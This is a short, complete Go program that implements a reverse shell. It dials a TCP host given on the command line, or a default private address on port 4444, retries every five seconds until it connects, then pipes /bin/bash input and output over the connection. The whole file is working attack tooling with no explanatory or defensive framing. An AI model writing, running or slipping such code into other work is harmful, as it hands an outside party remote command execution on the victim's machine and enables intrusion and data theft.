package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const default_host = "192.168.18.128:4444"
const shell = "/bin/bash"

func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if err != nil {
		if c != nil {
			c.Close()
			log.Fatal(err.Error())
		}
		fmt.Println("Error:", err.Error())

		if strings.Contains(err.Error(), "missing port in address") {
			fmt.Println("Make sure to specify host with IP:PORT")
			os.Exit(1)
		}

		fmt.Println("Waiting 5 seconds...")
		time.Sleep(time.Second * 5)

		reverse(host)
	}

	fmt.Println("Connecting to", host)

	cmd := exec.Command(shell)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	oop := cmd.Run()
	if oop != nil {
		log.Fatalln("cmd.Run() failed with", oop.Error())
	}

	c.Close()
}

func main() {
	var host string

	if len(os.Args) < 2 {
		host = default_host
	} else {
		host = os.Args[1]
	}
	reverse(host)
}
